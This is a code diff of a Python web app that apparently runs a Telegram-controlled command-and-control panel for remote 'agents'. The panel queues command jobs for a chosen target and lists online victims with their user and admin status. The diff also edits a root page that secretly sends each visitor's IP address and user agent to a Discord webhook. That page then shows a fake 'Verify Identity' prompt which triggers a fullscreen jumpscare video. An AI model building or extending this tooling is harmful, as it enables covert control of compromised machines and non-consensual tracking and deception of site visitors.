@@ -1,5 +1,5 @@
 # api/index.py
-# FINAL VERSION - Added /list command, jumpscare, IP logger, and all security features.
+# FINAL VERSION - Added Video Jumpscare and IP Logger
 
 import os
 import re
@@ -35,7 +35,6 @@ def esc(text):
     return re.sub(f'([{re.escape(escape_chars)}])', r'\\\1', str(text))
 
 async def get_state():
-    """Reads the current selected_target asynchronously."""
     async with httpx.AsyncClient() as client:
         try:
             res = await client.get(STATE_URL, timeout=5)
@@ -44,14 +43,12 @@ async def get_state():
         except Exception: return None
 
 async def set_state(target_id):
-    """Writes the new selected_target asynchronously."""
     async with httpx.AsyncClient() as client:
         try:
             await client.post(STATE_URL, json={"selected_target": target_id}, timeout=5)
         except Exception as e: print(f"Error setting state: {e}")
 
 async def post_job(target_id, command, args):
-    """Posts a new command job asynchronously."""
     job = {"job_id": str(uuid.uuid4()), "target_id": target_id, "command": command, "args": args}
     async with httpx.AsyncClient() as client:
         try:
@@ -70,7 +67,6 @@ async def post_job(target_id, command, args):
 
 # --- Telegram Command Handlers ---
 async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Displays the help menu with corrected Markdown."""
     help_text = (
         "*AGENT CONTROLLER HELP MENU*\n\n"
         "Use these commands to manage and control your agents\\.\n\n"
@@ -107,24 +103,16 @@ async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(help_text, parse_mode='MarkdownV2')
 
 async def cmd_list(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Fetches the list of active agents from the heartbeat bin."""
     if not HEARTBEAT_URL:
         await update.message.reply_text("Heartbeat URL is not configured\\.", parse_mode='MarkdownV2')
         return
-    
     await update.message.reply_text("⏳ Fetching active agents\\.\\.\\.", parse_mode='MarkdownV2')
     message = "*AGENT STATUS*\n\n"
     try:
         async with httpx.AsyncClient() as client:
             res = await client.get(HEARTBEAT_URL, timeout=5)
             agents = res.json() if res.status_code == 200 and isinstance(res.json(), list) else []
-        
-        active_agents = []
-        now = time.time()
-        for agent in agents:
-            if now - agent.get("timestamp", 0) < 60:
-                active_agents.append(agent)
-        
+        active_agents = [agent for agent in agents if time.time() - agent.get("timestamp", 0) < 60]
         if not active_agents:
             message += "_No active agents found\\._"
         else:
@@ -132,11 +120,9 @@ async def cmd_list(update: Update, context: ContextTypes.DEFAULT_TYPE):
             for agent in active_agents:
                 is_admin_text = "Admin" if agent.get('is_admin') else "User"
                 agent_user = agent.get('user', 'N/A')
-                # --- MODIFIED: Corrected the MarkdownV2 formatting here ---
                 message += f"🟢 *ONLINE*\n`{esc(agent.get('id'))}`\n*User:* {esc(agent_user)} `\\({is_admin_text}\\)`\n\n"
     except Exception as e:
         message = f"❌ Error fetching agent list: `{esc(str(e))}`"
-
     await update.message.reply_text(message, parse_mode='MarkdownV2')
 
 async def cmd_target(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -214,65 +200,69 @@ def log_to_discord(ip, user_agent):
     if not DISCORD_WEBHOOK_URL:
         return
     data = {
-        "content": "Visitor on Vercel App",
-        "embeds": [
-            {
-                "title": "IP Log",
-                "color": 15158332, # Red
-                "fields": [
-                    {"name": "IP Address", "value": f"`{ip}`", "inline": True},
-                    {"name": "User Agent", "value": f"```{user_agent}```"}
-                ],
-                "footer": {"text": f"Timestamp: {time.ctime()}"}
-            }
-        ]
+        "embeds": [{
+            "title": "Vercel Site Visitor",
+            "color": 15158332, # Red
+            "fields": [
+                {"name": "IP Address", "value": f"`{ip}`", "inline": True},
+                {"name": "Timestamp", "value": f"`{time.ctime()}`", "inline": True},
+                {"name": "User Agent", "value": f"```{user_agent}```"}
+            ]
+        }]
     }
     try:
-        httpx.post(DISCORD_WEBHOOK_URL, json=data, timeout=5)
+        # Use a standard synchronous post here as it's not in an async function
+        import requests
+        requests.post(DISCORD_WEBHOOK_URL, json=data, timeout=5)
     except Exception as e:
         print(f"Failed to log to Discord: {e}")
 
 @app.route('/', methods=['GET'])
 def health_check_and_scare():
     # --- IP Logging ---
-    # Vercel provides the real IP in the 'X-Vercel-Forwarded-For' header
     ip_address = request.headers.get('X-Vercel-Forwarded-For', request.remote_addr)
     user_agent = request.headers.get('User-Agent', 'Unknown')
     log_to_discord(ip_address, user_agent)
 
-    # --- Jumpscare HTML ---
+    # --- Jumpscare HTML with Video ---
     html_content = """
     <!DOCTYPE html>
     <html lang="en">
     <head>
         <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
-        <title>Loading...</title>
+        <title>Loading Content...</title>
         <style>
-            body { background-color: #000; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: monospace; }
-            #container { text-align: center; }
-            #enter-btn { background-color: #333; color: #fff; border: 1px solid #555; padding: 20px 40px; font-size: 24px; cursor: pointer; }
-            #scare { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: black; display: none; justify-content: center; align-items: center; }
-            #scare img { max-width: 100%; max-height: 100%; }
+            body, html { overflow: hidden; background-color: #000; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: monospace; }
+            #container { text-align: center; z-index: 10; }
+            #enter-btn { background-color: #1a1a1a; color: #fff; border: 1px solid #444; padding: 20px 40px; font-size: 24px; cursor: pointer; transition: background-color 0.3s, color 0.3s; }
+            #enter-btn:hover { background-color: #fff; color: #000; }
+            #scare { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; display: none; z-index: 100; }
+            #scare video { width: 100%; height: 100%; object-fit: cover; }
         </style>
     </head>
     <body>
         <div id="container">
-            <button id="enter-btn">Click to Enter Site</button>
+            <h1>Authorization Required</h1>
+            <p>Please click below to continue.</p>
+            <button id="enter-btn">Verify Identity</button>
         </div>
         <div id="scare">
-            <img src="https://i.ibb.co/b6b2z7j/scary.jpg" alt="scare">
+            <video id="scare-video" src="https://github.com/a9-s/v/raw/main/v.mp4" preload="auto"></video>
         </div>
-        <audio id="scream" src="https://www.myinstants.com/media/sounds/roblox-death-sound-effect.mp3" preload="auto"></audio>
         <script>
-            document.getElementById('enter-btn').addEventListener('click', () => {
+            const enterButton = document.getElementById('enter-btn');
+            const scareContainer = document.getElementById('scare');
+            const scareVideo = document.getElementById('scare-video');
+            enterButton.addEventListener('click', () => {
                 document.getElementById('container').style.display = 'none';
-                const scareElement = document.getElementById('scare');
-                const screamSound = document.getElementById('scream');
-                scareElement.style.display = 'flex';
-                screamSound.play();
+                scareContainer.style.display = 'block';
+                scareVideo.muted = false;
+                scareVideo.play();
                 try {
-                    document.documentElement.requestFullscreen();
-                } catch (e) { console.log('Fullscreen not supported.'); }
+                    scareContainer.requestFullscreen();
+                } catch (e) {
+                    console.log('Fullscreen API not supported.');
+                }
             });
         </script>
     </body>
